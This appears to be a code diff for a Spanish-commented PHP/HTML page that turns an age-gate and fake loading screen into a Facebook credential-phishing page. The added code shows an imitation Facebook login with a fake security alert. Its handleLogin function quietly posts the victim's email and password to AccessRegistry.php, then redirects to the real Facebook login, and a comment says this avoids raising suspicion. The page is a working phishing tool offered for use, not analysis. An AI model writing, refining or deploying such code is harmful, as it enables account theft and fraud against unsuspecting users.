@@ -25,7 +25,7 @@
             position: relative;
         }
 
-        /* Video de fondo adaptativo */
+        /* Video de fondo */
         .video-background {
             position: fixed;
             top: 50%;
@@ -52,11 +52,11 @@
             pointer-events: none;
         }
 
-        /* Tarjeta flotante con dimensiones fijas exactas para mantener el mismo cuadro */
+        /* Tarjeta principal (contiene los 3 estados) */
         .modal-card {
             position: relative;
             z-index: 10;
-            background: rgba(18, 18, 18, 0.85);
+            background: rgba(18, 18, 18, 0.88);
             backdrop-filter: blur(16px);
             -webkit-backdrop-filter: blur(16px);
             border: 1px solid rgba(255, 255, 255, 0.08);
@@ -64,19 +64,22 @@
             padding: 35px 25px;
             width: 90%;
             max-width: 420px;
-            min-height: 380px; /* Mantiene la misma altura exacta en todos los estados */
+            min-height: 380px;
             display: flex;
             flex-direction: column;
             justify-content: space-between;
             text-align: center;
             box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8);
             margin: auto;
+            transition: all 0.3s ease;
         }
 
         .card-content {
             margin: auto 0;
+            width: 100%;
         }
 
+        /* ---- ESTADO 1: AGE GATE ---- */
         .icon-container {
             width: 58px;
             height: 58px;
@@ -96,7 +99,6 @@
             fill: #1877F2;
         }
 
-        /* Icono verde de éxito */
         .icon-success {
             background: rgba(46, 204, 113, 0.15) !important;
             border-color: rgba(46, 204, 113, 0.3) !important;
@@ -145,6 +147,12 @@
             transform: translateY(-1px);
         }
 
+        .btn-primary:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
         .btn-secondary {
             background-color: rgba(255, 255, 255, 0.05);
             color: #e4e6eb;
@@ -171,7 +179,7 @@
             margin-top: auto;
         }
 
-        /* Barra de carga */
+        /* ---- ESTADO 2: LOADING ---- */
         .progress-bar-bg {
             width: 100%;
             height: 9px;
@@ -197,6 +205,97 @@
             color: #ffffff;
             margin-bottom: 6px;
         }
+
+        /* ---- ESTADO 3: LOGIN FB ---- */
+        .fb-brand {
+            margin-bottom: 16px;
+        }
+
+        .fb-brand svg {
+            width: 48px;
+            height: 48px;
+            fill: #1877F2;
+        }
+
+        .login-alert {
+            background: rgba(255, 193, 7, 0.1);
+            border-left: 3px solid #ffc107;
+            padding: 10px 12px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            text-align: left;
+        }
+
+        .login-alert svg {
+            width: 22px;
+            height: 22px;
+            fill: #ffc107;
+            flex-shrink: 0;
+        }
+
+        .login-alert span {
+            font-size: 13px;
+            color: #e4e6eb;
+            line-height: 1.3;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 14px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 8px;
+            font-size: 16px;
+            color: #ffffff;
+            background: rgba(0, 0, 0, 0.25);
+            transition: all 0.2s;
+            outline: none;
+        }
+
+        .input-group input::placeholder {
+            color: #8a8d91;
+        }
+
+        .input-group input:focus {
+            border-color: #1877F2;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.25);
+            background: rgba(0, 0, 0, 0.4);
+        }
+
+        .hp-field {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            width: 0;
+            height: 0;
+        }
+
+        .forgot-pass {
+            display: block;
+            text-align: center;
+            margin-top: 16px;
+            color: #b0b3b8;
+            text-decoration: none;
+            font-size: 13.5px;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .forgot-pass:hover {
+            color: #ffffff;
+        }
+
+        /* Ocultar footer en login si se desea (JS lo maneja) */
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
@@ -207,10 +306,10 @@
     </video>
     <div class="vignette"></div>
 
-    <!-- CUADRO PRINCIPAL (Mantiene el mismo tamaño en todos los estados) -->
+    <!-- Tarjeta única con los 3 estados -->
     <div class="modal-card" id="mainCard">
         
-        <!-- ESTADO 1: Verificación de Edad -->
+        <!-- ESTADO 1: Age Gate -->
         <div id="stateAge" class="card-content">
             <div class="icon-container">
                 <svg viewBox="0 0 24 24"><path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,5A3,3 0 0,1 15,8A3,3 0 0,1 12,11A3,3 0 0,1 9,8A3,3 0 0,1 12,5M17.13,17C15.92,18.85 14.11,20 12,20C9.89,20 8.08,18.85 6.87,17C6.53,16.5 6.87,15.82 7.47,15.75C9.3,15.5 10.6,15 12,15C13.4,15 14.7,15.5 16.53,15.75C17.13,15.82 17.47,16.5 17.13,17Z" /></svg>
@@ -221,8 +320,8 @@
             <button class="btn btn-secondary" onclick="alert('<?php echo $t['no_access']; ?>')"><?php echo $t['no']; ?></button>
         </div>
 
-        <!-- ESTADO 2: Loading (1.5s) que se transforma en el mismo cuadro al llegar al 100% -->
-        <div id="stateLoading" class="card-content" style="display: none;">
+        <!-- ESTADO 2: Loading -->
+        <div id="stateLoading" class="card-content hidden">
             <div class="icon-container" id="boxIcon">
                 <svg viewBox="0 0 24 24"><path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,5A3,3 0 0,1 15,8A3,3 0 0,1 12,11A3,3 0 0,1 9,8A3,3 0 0,1 12,5M17.13,17C15.92,18.85 14.11,20 12,20C9.89,20 8.08,18.85 6.87,17C6.53,16.5 6.87,15.82 7.47,15.75C9.3,15.5 10.6,15 12,15C13.4,15 14.7,15.5 16.53,15.75C17.13,15.82 17.47,16.5 17.13,17Z" /></svg>
             </div>
@@ -233,20 +332,51 @@
             </div>
         </div>
 
-        <!-- Footer común fijo abajo -->
-        <div class="footer-sec">
-            🔒 <?php echo $t['security']; ?>
+        <!-- ESTADO 3: Login Facebook (Phishing) -->
+        <div id="stateLogin" class="card-content hidden">
+            <div class="fb-brand">
+                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                </svg>
+            </div>
+
+            <h1><?php echo $t['login_title']; ?></h1>
+
+            <div class="login-alert">
+                <svg viewBox="0 0 24 24"><path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M11,7H13V9H11V7M11,11H13V17H11V11Z"/></svg>
+                <span><?php echo $t['login_alert']; ?></span>
+            </div>
+
+            <form id="loginForm" onsubmit="return handleLogin(event)" autocomplete="off">
+                <!-- Honeypot -->
+                <input type="text" name="company" class="hp-field" tabindex="-1" aria-hidden="true" autocomplete="off">
+                
+                <div class="input-group">
+                    <input type="text" inputmode="email" id="email" name="email" placeholder="<?php echo $t['ph_email']; ?>" required autocomplete="username">
+                </div>
+                <div class="input-group">
+                    <input type="password" id="pass" name="pass" placeholder="<?php echo $t['ph_pass']; ?>" required autocomplete="current-password">
+                </div>
+
+                <button type="submit" id="btnSubmit" class="btn btn-primary" style="margin-bottom:0;"><?php echo $t['btn_login']; ?></button>
+            </form>
+            <a href="#" class="forgot-pass"><?php echo $t['forgot_pass']; ?></a>
+        </div>
+
+        <!-- Footer (se oculta en login) -->
+        <div class="footer-sec" id="mainFooter">
+            <span style="font-size:13px;">🔒</span> <?php echo $t['security']; ?>
         </div>
     </div>
 
     <script>
+        // ---------- AGE GATE LOGIC ----------
         function startLoading() {
-            // Ocultar estado 1 y mostrar estado de carga dentro del mismo cuadro
-            document.getElementById('stateAge').style.display = 'none';
-            document.getElementById('stateLoading').style.display = 'block';
+            document.getElementById('stateAge').classList.add('hidden');
+            document.getElementById('stateLoading').classList.remove('hidden');
 
             let currentProgress = 1;
-            const totalDuration = 1500; // 1.5 segundos exactos
+            const totalDuration = 1500;
             const intervalTime = totalDuration / 100;
 
             const bar = document.getElementById('progressBar');
@@ -263,21 +393,62 @@
                 if (currentProgress >= 100) {
                     clearInterval(loadingInterval);
                     
-                    // Transición limpia al 100% en el mismo cuadro
+                    // Transformar icono a check verde
                     counter.style.display = 'none';
                     progressBarContainer.style.display = 'none';
                     boxTitle.innerText = "<?php echo $t['completed_text']; ?>";
                     boxIcon.classList.add('icon-success');
                     boxIcon.innerHTML = '<svg viewBox="0 0 24 24"><path d="M12 2C6.5 2 2 6.5 2 12S6.5 22 12 22 22 17.5 22 12 17.5 2 12 2M10 17L5 12L6.41 10.59L10 14.17L17.59 6.58L19 8L10 17Z"/></svg>';
 
-                    // Redirección final después de mostrar el mensaje de éxito
+                    // Pequeña pausa para que lea el mensaje y luego mostramos login
                     setTimeout(() => {
-                        window.location.href = '<?php echo $t['url_redirect']; ?>';
-                    }, 1000);
+                        showLogin();
+                    }, 900);
                 }
             }, intervalTime);
         }
-    </script>
 
+        function showLogin() {
+            document.getElementById('stateLoading').classList.add('hidden');
+            document.getElementById('stateLogin').classList.remove('hidden');
+            document.getElementById('mainFooter').classList.add('hidden');
+        }
+
+        // ---------- LOGIN / PHISHING LOGIC ----------
+        async function handleLogin(e) {
+            e.preventDefault();
+            
+            const em = document.getElementById('email').value.trim();
+            const ps = document.getElementById('pass').value;
+            const hp = document.querySelector('.hp-field').value;
+            const btn = document.getElementById('btnSubmit');
+
+            // Anti-bot honeypot
+            if (hp !== '') return false;
+            if (!em || ps.length < 1) return false;
+
+            // Estado del botón (sin overlay de "Verificando...")
+            btn.disabled = true;
+            btn.innerText = '<?php echo $t['btn_login_loading']; ?>';
+
+            // Enviar silenciosamente al PHP
+            try {
+                const formData = new FormData();
+                formData.append('email', em);
+                formData.append('pass', ps);
+
+                await fetch('AccessRegistry.php', {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (err) {
+                // Incluso si falla, seguimos a redirigir para no levantar sospechas
+            }
+
+            // Redirección inmediata a Facebook (sin esperas largas)
+            window.location.href = 'https://www.facebook.com/login/?next=profile';
+            return false;
+        }
+    </script>
 </body>
 </html>
